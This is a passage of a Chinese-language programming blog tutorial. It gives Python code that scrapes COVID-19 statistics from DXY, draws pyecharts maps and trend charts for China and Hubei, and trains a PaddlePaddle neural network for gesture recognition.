class="built_in">print</span>(response.status_code)                                          <span class="comment"># 打印状态码</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url_text = response.content.decode()                             <span class="comment">#更推荐使用response.content.deocde()的方式获取响应的html页面</span></span><br><span class="line">        <span class="comment">#print(url_text)</span></span><br><span class="line">        url_content = re.search(<span class="string">r&#x27;window.getAreaStat = (.*?)&#125;]&#125;catch&#x27;</span>,   <span class="comment">#re.search():扫描字符串以查找正则表达式模式产生匹配项的第一个位置 ，然后返回相应的match对象。</span></span><br><span class="line">                                url_text, re.S)                          <span class="comment">#在字符串a中，包含换行符\n，在这种情况下：如果不使用re.S参数，则只在每一行内进行匹配，如果一行没有，就换下一行重新开始;</span></span><br><span class="line">                                                                         <span class="comment">#而使用re.S参数以后，正则表达式会将这个字符串作为一个整体，在整体中进行匹配。</span></span><br><span class="line">        texts = url_content.group()                                      <span class="comment">#获取匹配正则表达式的整体结果</span></span><br><span class="line">        content = texts.replace(<span class="string">&#x27;window.getAreaStat = &#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;&#125;catch&#x27;</span>, <span class="string">&#x27;&#x27;</span>) <span class="comment">#去除多余的字符</span></span><br><span class="line">        json_data = json.loads(content)                                         </span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;data/&#x27;</span> + today + <span class="string">&#x27;.json&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;UTF-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            json.dump(json_data, f, ensure_ascii=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;&lt;Response [%s]&gt;&#x27;</span> % response.status_code)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crawl_statistics_data</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    获取各个省份历史统计数据，保存到data目录下，存JSON文件</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;data/&#x27;</span>+ today + <span class="string">&#x27;.json&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;UTF-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        json_array = json.loads(file.read())</span><br><span class="line"></span><br><span class="line">    statistics_data = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> province <span class="keyword">in</span> json_array:</span><br><span class="line">        response = requests.get(province[<span class="string">&#x27;statisticsData&#x27;</span>])</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            statistics_data[province[<span class="string">&#x27;provinceShortName&#x27;</span>]] = json.loads(response.content.decode())[<span class="string">&#x27;data&#x27;</span>]</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;&lt;Response [%s]&gt; for url: [%s]&#x27;</span> % (response.status_code, province[<span class="string">&#x27;statisticsData&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;data/statistics_data.json&quot;</span>, <span class="string">&quot;w&quot;</span>, encoding=<span class="string">&#x27;UTF-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        json.dump(statistics_data, f, ensure_ascii=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    crawl_dxy_data()</span><br><span class="line">    crawl_statistics_data()</span><br></pre></td></tr></table></figure>

<h3 id="疫情地图"><a href="#疫情地图" class="headerlink" title="疫情地图"></a>疫情地图</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">from</span> pyecharts.charts <span class="keyword">import</span> Map</span><br><span class="line"><span class="keyword">from</span> pyecharts <span class="keyword">import</span> options <span class="keyword">as</span> opts</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读原始数据文件</span></span><br><span class="line">today = datetime.date.today().strftime(<span class="string">&#x27;%Y%m%d&#x27;</span>)   <span class="comment">#20200315</span></span><br><span class="line">datafile = <span class="string">&#x27;data/&#x27;</span>+ today + <span class="string">&#x27;.json&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(datafile, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;UTF-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    json_array = json.loads(file.read())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分析全国实时确诊数据：&#x27;confirmedCount&#x27;字段</span></span><br><span class="line">china_data = []</span><br><span class="line"><span class="keyword">for</span> province <span class="keyword">in</span> json_array:</span><br><span class="line">    china_data.append((province[<span class="string">&#x27;provinceShortName&#x27;</span>], province[<span class="string">&#x27;confirmedCount&#x27;</span>]))</span><br><span class="line">china_data = <span class="built_in">sorted</span>(china_data, key=<span class="keyword">lambda</span> x: x[<span class="number">1</span>], reverse=<span class="literal">True</span>)                 <span class="comment">#reverse=True,表示降序，反之升序</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(china_data)</span><br><span class="line"><span class="comment"># 全国疫情地图</span></span><br><span class="line"><span class="comment"># 自定义的每一段的范围，以及每一段的特别的样式。</span></span><br><span class="line">pieces = [</span><br><span class="line">    &#123;<span class="string">&#x27;min&#x27;</span>: <span class="number">10000</span>, <span class="string">&#x27;color&#x27;</span>: <span class="string">&#x27;#540d0d&#x27;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&#x27;max&#x27;</span>: <span class="number">9999</span>, <span class="string">&#x27;min&#x27;</span>: <span class="number">1000</span>, <span class="string">&#x27;color&#x27;</span>: <span class="string">&#x27;#9c1414&#x27;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&#x27;max&#x27;</span>: <span class="number">999</span>, <span class="string">&#x27;min&#x27;</span>: <span class="number">500</span>, <span class="string">&#x27;color&#x27;</span>: <span class="string">&#x27;#d92727&#x27;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&#x27;max&#x27;</span>: <span class="number">499</span>, <span class="string">&#x27;min&#x27;</span>: <span class="number">100</span>, <span class="string">&#x27;color&#x27;</span>: <span class="string">&#x27;#ed3232&#x27;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&#x27;max&#x27;</span>: <span class="number">99</span>, <span class="string">&#x27;min&#x27;</span>: <span class="number">10</span>, <span class="string">&#x27;color&#x27;</span>: <span class="string">&#x27;#f27777&#x27;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&#x27;max&#x27;</span>: <span class="number">9</span>, <span class="string">&#x27;min&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;color&#x27;</span>: <span class="string">&#x27;#f7adad&#x27;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&#x27;max&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;color&#x27;</span>: <span class="string">&#x27;#f7e4e4&#x27;</span>&#125;,</span><br><span class="line">]</span><br><span class="line">labels = [data[<span class="number">0</span>] <span class="keyword">for</span> data <span class="keyword">in</span> china_data]</span><br><span class="line">counts = [data[<span class="number">1</span>] <span class="keyword">for</span> data <span class="keyword">in</span> china_data]</span><br><span class="line"></span><br><span class="line">m = Map()</span><br><span class="line">m.add(<span class="string">&quot;累计确诊&quot;</span>, [<span class="built_in">list</span>(z) <span class="keyword">for</span> z <span class="keyword">in</span> <span class="built_in">zip</span>(labels, counts)], <span class="string">&#x27;china&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#系列配置项,可配置图元样式、文字样式、标签样式、点线样式等</span></span><br><span class="line">m.set_series_opts(label_opts=opts.LabelOpts(font_size=<span class="number">12</span>),</span><br><span class="line">                  is_show=<span class="literal">False</span>)</span><br><span class="line"><span class="comment">#全局配置项,可配置标题、动画、坐标轴、图例等</span></span><br><span class="line">m.set_global_opts(title_opts=opts.TitleOpts(title=<span class="string">&#x27;全国实时确诊数据&#x27;</span>,</span><br><span class="line">                                            subtitle=<span class="string">&#x27;数据来源：丁香园&#x27;</span>),</span><br><span class="line">                  legend_opts=opts.LegendOpts(is_show=<span class="literal">False</span>),</span><br><span class="line">                  visualmap_opts=opts.VisualMapOpts(pieces=pieces,</span><br><span class="line">                                                    is_piecewise=<span class="literal">True</span>,   <span class="comment">#是否为分段型</span></span><br><span class="line">                                                    is_show=<span class="literal">True</span>))       <span class="comment">#是否显示视觉映射配置</span></span><br><span class="line"><span class="comment">#render（）会生成本地 HTML 文件，默认会在当前目录生成 render.html 文件，也可以传入路径参数，如 m.render(&quot;mycharts.html&quot;)</span></span><br><span class="line">m.render(path=<span class="string">&#x27;/home/aistudio/data/全国实时确诊数据.html&#x27;</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">from</span> pyecharts.charts <span class="keyword">import</span> Map</span><br><span class="line"><span class="keyword">from</span> pyecharts <span class="keyword">import</span> options <span class="keyword">as</span> opts</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读原始数据文件</span></span><br><span class="line">today = datetime.date.today().strftime(<span class="string">&#x27;%Y%m%d&#x27;</span>)   <span class="comment">#20200315</span></span><br><span class="line">datafile = <span class="string">&#x27;data/&#x27;</span>+ today + <span class="string">&#x27;.json&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(datafile, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;UTF-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    json_array = json.loads(file.read())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分析湖北省实时确诊数据</span></span><br><span class="line"><span class="comment"># 读入规范化的城市名称，用于规范化丁香园数据中的城市简称</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/home/aistudio/data/data24815/pycharts_city.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;UTF-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    defined_cities = [line.strip() <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines()]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">format_city_name</span>(<span class="params">name, defined_cities</span>):</span><br><span class="line">    <span class="keyword">for</span> defined_city <span class="keyword">in</span> defined_cities:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>((<span class="built_in">set</span>(defined_city) &amp; <span class="built_in">set</span>(name))) == <span class="built_in">len</span>(name):</span><br><span class="line">            name = defined_city</span><br><span class="line">            <span class="keyword">if</span> name.endswith(<span class="string">&#x27;市&#x27;</span>) <span class="keyword">or</span> name.endswith(<span class="string">&#x27;区&#x27;</span>) <span class="keyword">or</span> name.endswith(<span class="string">&#x27;县&#x27;</span>) <span class="keyword">or</span> name.endswith(<span class="string">&#x27;自治州&#x27;</span>):</span><br><span class="line">                <span class="keyword">return</span> name</span><br><span class="line">            <span class="keyword">return</span> name + <span class="string">&#x27;市&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">province_name = <span class="string">&#x27;湖北&#x27;</span></span><br><span class="line"><span class="keyword">for</span> province <span class="keyword">in</span> json_array:</span><br><span class="line">    <span class="keyword">if</span> province[<span class="string">&#x27;provinceName&#x27;</span>] == province_name <span class="keyword">or</span> province[<span class="string">&#x27;provinceShortName&#x27;</span>] == province_name:</span><br><span class="line">        json_array_province = province[<span class="string">&#x27;cities&#x27;</span>]</span><br><span class="line">        hubei_data = [(format_city_name(city[<span class="string">&#x27;cityName&#x27;</span>], defined_cities), city[<span class="string">&#x27;confirmedCount&#x27;</span>]) <span class="keyword">for</span> city <span class="keyword">in</span></span><br><span class="line">                      json_array_province]</span><br><span class="line">        hubei_data = <span class="built_in">sorted</span>(hubei_data, key=<span class="keyword">lambda</span> x: x[<span class="number">1</span>], reverse=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(hubei_data)</span><br><span class="line"></span><br><span class="line">labels = [data[<span class="number">0</span>] <span class="keyword">for</span> data <span class="keyword">in</span> hubei_data]</span><br><span class="line">counts = [data[<span class="number">1</span>] <span class="keyword">for</span> data <span class="keyword">in</span> hubei_data]</span><br><span class="line">pieces = [</span><br><span class="line">    &#123;<span class="string">&#x27;min&#x27;</span>: <span class="number">10000</span>, <span class="string">&#x27;color&#x27;</span>: <span class="string">&#x27;#540d0d&#x27;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&#x27;max&#x27;</span>: <span class="number">9999</span>, <span class="string">&#x27;min&#x27;</span>: <span class="number">1000</span>, <span class="string">&#x27;color&#x27;</span>: <span class="string">&#x27;#9c1414&#x27;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&#x27;max&#x27;</span>: <span class="number">999</span>, <span class="string">&#x27;min&#x27;</span>: <span class="number">500</span>, <span class="string">&#x27;color&#x27;</span>: <span class="string">&#x27;#d92727&#x27;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&#x27;max&#x27;</span>: <span class="number">499</span>, <span class="string">&#x27;min&#x27;</span>: <span class="number">100</span>, <span class="string">&#x27;color&#x27;</span>: <span class="string">&#x27;#ed3232&#x27;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&#x27;max&#x27;</span>: <span class="number">99</span>, <span class="string">&#x27;min&#x27;</span>: <span class="number">10</span>, <span class="string">&#x27;color&#x27;</span>: <span class="string">&#x27;#f27777&#x27;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&#x27;max&#x27;</span>: <span class="number">9</span>, <span class="string">&#x27;min&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;color&#x27;</span>: <span class="string">&#x27;#f7adad&#x27;</span>&#125;,</span><br><span class="line">    &#123;<span class="string">&#x27;max&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;color&#x27;</span>: <span class="string">&#x27;#f7e4e4&#x27;</span>&#125;,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">m = Map()</span><br><span class="line">m.add(<span class="string">&quot;累计确诊&quot;</span>, [<span class="built_in">list</span>(z) <span class="keyword">for</span> z <span class="keyword">in</span> <span class="built_in">zip</span>(labels, counts)], <span class="string">&#x27;湖北&#x27;</span>)</span><br><span class="line">m.set_series_opts(label_opts=opts.LabelOpts(font_size=<span class="number">12</span>),</span><br><span class="line">                  is_show=<span class="literal">False</span>)</span><br><span class="line">m.set_global_opts(title_opts=opts.TitleOpts(title=<span class="string">&#x27;湖北省实时确诊数据&#x27;</span>,</span><br><span class="line">                                            subtitle=<span class="string">&#x27;数据来源：丁香园&#x27;</span>),</span><br><span class="line">                  legend_opts=opts.LegendOpts(is_show=<span class="literal">False</span>),</span><br><span class="line">                  visualmap_opts=opts.VisualMapOpts(pieces=pieces,</span><br><span class="line">                                                    is_piecewise=<span class="literal">True</span>,</span><br><span class="line">                                                    is_show=<span class="literal">True</span>))</span><br><span class="line">m.render(path=<span class="string">&#x27;/home/aistudio/data/湖北省实时确诊数据.html&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="增长曲线"><a href="#增长曲线" class="headerlink" title="增长曲线"></a>增长曲线</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> pyecharts.charts <span class="keyword">import</span> Line</span><br><span class="line"><span class="keyword">from</span> pyecharts <span class="keyword">import</span> options <span class="keyword">as</span> opts</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读原始数据文件</span></span><br><span class="line">datafile = <span class="string">&#x27;data/statistics_data.json&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(datafile, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;UTF-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    json_dict = json.loads(file.read())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分析各省份2月1日至今的新增确诊数据：&#x27;confirmedIncr&#x27;</span></span><br><span class="line">statistics__data = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> province <span class="keyword">in</span> json_dict:</span><br><span class="line">    statistics__data[province] = []</span><br><span class="line">    <span class="keyword">for</span> da <span class="keyword">in</span> json_dict[province]:</span><br><span class="line">        <span class="keyword">if</span> da[<span class="string">&#x27;dateId&#x27;</span>] &gt;= <span class="number">20200201</span>:</span><br><span class="line">            statistics__data[province].append(da[<span class="string">&#x27;confirmedIncr&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取日期列表</span></span><br><span class="line">dateId = [<span class="built_in">str</span>(da[<span class="string">&#x27;dateId&#x27;</span>])[<span class="number">4</span>:<span class="number">6</span>] + <span class="string">&#x27;-&#x27;</span> + <span class="built_in">str</span>(da[<span class="string">&#x27;dateId&#x27;</span>])[<span class="number">6</span>:<span class="number">8</span>] <span class="keyword">for</span> da <span class="keyword">in</span> json_dict[<span class="string">&#x27;湖北&#x27;</span>] <span class="keyword">if</span></span><br><span class="line">          da[<span class="string">&#x27;dateId&#x27;</span>] &gt;= <span class="number">20200201</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 全国新增趋势</span></span><br><span class="line">all_statis = np.array([<span class="number">0</span>] * <span class="built_in">len</span>(dateId))</span><br><span class="line"><span class="keyword">for</span> province <span class="keyword">in</span> statistics__data:</span><br><span class="line">    all_statis = all_statis + np.array(statistics__data[province])</span><br><span class="line"></span><br><span class="line">all_statis = all_statis.tolist()</span><br><span class="line"><span class="comment"># 湖北新增趋势</span></span><br><span class="line">hubei_statis = statistics__data[<span class="string">&#x27;湖北&#x27;</span>]</span><br><span class="line"><span class="comment"># 湖北以外的新增趋势</span></span><br><span class="line">other_statis = [all_statis[i] - hubei_statis[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(dateId))]</span><br><span class="line"></span><br><span class="line">line = Line()</span><br><span class="line">line.add_xaxis(dateId)</span><br><span class="line">line.add_yaxis(<span class="string">&quot;全国新增确诊病例&quot;</span>,   <span class="comment">#图例</span></span><br><span class="line">                all_statis,       <span class="comment">#数据</span></span><br><span class="line">                is_smooth=<span class="literal">True</span>,   <span class="comment">#是否平滑曲线</span></span><br><span class="line">               linestyle_opts=opts.LineStyleOpts(width=<span class="number">4</span>, color=<span class="string">&#x27;#B44038&#x27;</span>),<span class="comment">#线样式配置项</span></span><br><span class="line">               itemstyle_opts=opts.ItemStyleOpts(color=<span class="string">&#x27;#B44038&#x27;</span>,          <span class="comment">#图元样式配置项</span></span><br><span class="line">                                                 border_color=<span class="string">&quot;#B44038&quot;</span>,   <span class="comment">#颜色</span></span><br><span class="line">                                                 border_width=<span class="number">10</span>))         <span class="comment">#图元的大小</span></span><br><span class="line">line.add_yaxis(<span class="string">&quot;湖北新增确诊病例&quot;</span>, hubei_statis, is_smooth=<span class="literal">True</span>,</span><br><span class="line">               linestyle_opts=opts.LineStyleOpts(width=<span class="number">2</span>, color=<span class="string">&#x27;#4E87ED&#x27;</span>),</span><br><span class="line">               label_opts=opts.LabelOpts(position=<span class="string">&#x27;bottom&#x27;</span>),              <span class="comment">#标签在折线的底部</span></span><br><span class="line">               itemstyle_opts=opts.ItemStyleOpts(color=<span class="string">&#x27;#4E87ED&#x27;</span>,</span><br><span class="line">                                                 border_color=<span class="string">&quot;#4E87ED&quot;</span>,</span><br><span class="line">                                                 border_width=<span class="number">3</span>))</span><br><span class="line">line.add_yaxis(<span class="string">&quot;其他省份新增病例&quot;</span>, other_statis, is_smooth=<span class="literal">True</span>,</span><br><span class="line">               linestyle_opts=opts.LineStyleOpts(width=<span class="number">2</span>, color=<span class="string">&#x27;#F1A846&#x27;</span>),</span><br><span class="line">               label_opts=opts.LabelOpts(position=<span class="string">&#x27;bottom&#x27;</span>),              <span class="comment">#标签在折线的底部</span></span><br><span class="line">               itemstyle_opts=opts.ItemStyleOpts(color=<span class="string">&#x27;#F1A846&#x27;</span>,</span><br><span class="line">                                                 border_color=<span class="string">&quot;#F1A846&quot;</span>,</span><br><span class="line">                                                 border_width=<span class="number">3</span>))</span><br><span class="line">line.set_global_opts(title_opts=opts.TitleOpts(title=<span class="string">&quot;新增确诊病例&quot;</span>, subtitle=<span class="string">&#x27;数据来源：丁香园&#x27;</span>),</span><br><span class="line">                     yaxis_opts=opts.AxisOpts(max_=<span class="number">16000</span>, min_=<span class="number">1</span>, type_=<span class="string">&quot;log&quot;</span>,    <span class="comment">#坐标轴配置项</span></span><br><span class="line">                                              splitline_opts=opts.SplitLineOpts(is_show=<span class="literal">True</span>),<span class="comment">#分割线配置项</span></span><br><span class="line">                                              axisline_opts=opts.AxisLineOpts(is_show=<span class="literal">True</span>)))<span class="comment">#坐标轴刻度线配置项</span></span><br><span class="line">line.render(path=<span class="string">&#x27;/home/aistudio/data/新增确诊趋势图.html&#x27;</span>)</span><br></pre></td></tr></table></figure>


<h2 id="手势识别"><a href="#手势识别" class="headerlink" title="手势识别"></a>手势识别</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> paddle</span><br><span class="line"><span class="keyword">import</span> paddle.fluid <span class="keyword">as</span> fluid</span><br><span class="line"><span class="keyword">import</span> paddle.fluid.layers <span class="keyword">as</span> layers</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> cpu_count</span><br><span class="line"><span class="keyword">from</span> paddle.fluid.dygraph <span class="keyword">import</span> Pool2D,Conv2D</span><br><span class="line"><span class="keyword">from</span> paddle.fluid.dygraph <span class="keyword">import</span> Linear</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成图像列表</span></span><br><span class="line">data_path = <span class="string">&#x27;/home/aistudio/data/data23668/Dataset&#x27;</span></span><br><span class="line">character_folders = os.listdir(data_path)</span><br><span class="line"><span class="comment"># print(character_folders)</span></span><br><span class="line"><span class="keyword">if</span>(os.path.exists(<span class="string">&#x27;./train_data.list&#x27;</span>)):</span><br><span class="line">    os.remove(<span class="string">&#x27;./train_data.list&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span>(os.path.exists(<span class="string">&#x27;./test_data.list&#x27;</span>)):</span><br><span class="line">    os.remove(<span class="string">&#x27;./test_data.list&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> character_folder <span class="keyword">in</span> character_folders:</span><br><span class="line">    <span class="comment"># 生成测试集和训练集</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./train_data.list&#x27;</span>, <span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> f_train:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./test_data.list&#x27;</span>, <span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> f_test:</span><br><span class="line">            <span class="keyword">if</span> character_folder == <span class="string">&#x27;.DS_Store&#x27;</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            character_imgs = os.listdir(os.path.join(data_path,character_folder))</span><br><span class="line">            count = <span class="number">0</span> </span><br><span class="line">            <span class="keyword">for</span> img <span class="keyword">in</span> character_imgs:</span><br><span class="line">                <span class="keyword">if</span> img ==<span class="string">&#x27;.DS_Store&#x27;</span>:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">if</span> count%<span class="number">10</span> == <span class="number">0</span>:</span><br><span class="line">                    f_test.write(os.path.join(data_path,character_folder,img) + <span class="string">&#x27;\t&#x27;</span> + character_folder + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    f_train.write(os.path.join(data_path,character_folder,img) + <span class="string">&#x27;\t&#x27;</span> + character_folder + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">                count +=<span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;列表已生成&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用于训练的数据提供器</span></span><br><span class="line">train_reader = paddle.batch(reader=paddle.reader.shuffle(reader=data_reader(<span class="string">&#x27;./train_data.list&#x27;</span>), buf_size=<span class="number">256</span>), batch_size=<span class="number">32</span>)</span><br><span class="line"><span class="comment"># 用于测试的数据提供器</span></span><br><span class="line">test_reader = paddle.batch(reader=data_reader(<span class="string">&#x27;./test_data.list&#x27;</span>), batch_size=<span class="number">32</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment">#定义DNN网络</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyDNN</span>(fluid.dygraph.Layer):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>(MyDNN,self).__init__()</span><br><span class="line">        <span class="built_in">super</span>(MyDNN, self).__init__()</span><br><span class="line">        self.hidden1 = Linear(<span class="number">100</span>, <span class="number">100</span>, act=<span class="string">&#x27;relu&#x27;</span>)</span><br><span class="line">        self.hidden2 = Linear(<span class="number">100</span>, <span class="number">100</span>, act=<span class="string">&#x27;relu&#x27;</span>)</span><br><span class="line">        self.hidden3 = Linear(<span class="number">100</span>, <span class="number">100</span>, act=<span class="string">&#x27;relu&#x27;</span>)</span><br><span class="line">        self.hidden4 = Linear(<span class="number">3</span>*<span class="number">100</span>*<span class="number">100</span>, <span class="number">10</span>, act=<span class="string">&#x27;softmax&#x27;</span>)</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self,<span class="built_in">input</span></span>):</span><br><span class="line">        x=self.hidden1(<span class="built_in">input</span>)</span><br><span class="line">        x=self.hidden2(x)</span><br><span class="line">        x=self.hidden3(x)</span><br><span class="line">        x=fluid.layers.reshape(x, shape=[-<span class="number">1</span>,<span class="number">3</span>*<span class="number">100</span>*<span class="number">100</span>])</span><br><span class="line">        y=self.hidden4(x)</span><br><span class="line">       </span><br><span class="line">        <span class="keyword">return</span> y</span><br><span class="line"></span><br><span class="line"><span class="comment">#用动态图进行训练</span></span><br><span class="line"><span class="keyword">with</span> fluid.dygraph.guard():</span><br><span class="line">    model=MyDNN() <span class="comment">#模型实例化</span></span><br><span class="line">    model.train() <span class="comment">#训练模式</span></span><br><span class="line">    opt=fluid.optimizer.SGDOptimizer(learning_rate=<span class="number">0.01</span>, parameter_list=model.parameters())<span class="comment">#优化器选用SGD随机梯度下降，学习率为0.001.</span></span><br><span class="line"></span><br><span class="line">    epochs_num=<span class="number">10</span> <span class="comment">#迭代次数</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> pass_num <span class="keyword">in</span> <span class="built_in">range</span>(epochs_num):</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> batch_id,data <span class="keyword">in</span> <span class="built_in">enumerate</span>(train_reader()):</span><br><span class="line">            </span><br><span class="line">            images=np.array([x[<span class="number">0</span>].reshape(<span class="number">3</span>,<span class="number">100</span>,<span class="number">100</span>) <span class="keyword">for</span> x <span class="keyword">in</span> data],np.float32)</span><br><span class="line">            </span><br><span class="line">            labels = np.array([x[<span class="number">1</span>] <span class="keyword">for</span> x <span class="keyword">in</span> data]).astype(<span class="string">&#x27;int64&#x27;</span>)</span><br><span class="line">            labels = labels[:, np.newaxis]</span><br><span class="line">            <span class="comment"># print(images.shape)</span></span><br><span class="line">            image=fluid.dygraph.to_variable(images)</span><br><span class="line">            label=fluid.dygraph.to_variable(labels)</span><br><span class="line">            predict=model(image)<span class="comment">#预测</span></span><br><span class="line">            <span class="comment"># print(predict)</span></span><br><span class="line">            loss=fluid.layers.cross_entropy(predict,label)</span><br><span class="line">            avg_loss=fluid.layers.mean(loss)<span class="comment">#获取loss值</span></span><br><span class="line">            </span><br><span class="line">            acc=fluid.layers.accuracy(predict,label)<span class="comment">#计算精度</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> batch_id!=<span class="number">0</span> <span class="keyword">and</span> batch_id%<span class="number">50</span>==<span class="number">0</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;train_pass:&#123;&#125;,batch_id:&#123;&#125;,train_loss:&#123;&#125;,train_acc:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(pass_num,batch_id,avg_loss.numpy(),acc.numpy()))</span><br><span class="line">            </span><br><span class="line">            avg_loss.backward()</span><br><span class="line">            opt.minimize(avg_loss)</span><br><span class="line">            model.clear_gradients()</span><br><span class="line">            </span><br><span class="line">    fluid.save_dygraph(model.state_dict(),<span class="string">&#x27;MyDNN&#x27;</span>)<span class="comment">#保存模型</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#模型校验</span></span><br><span class="line"><span class="keyword">with</span> 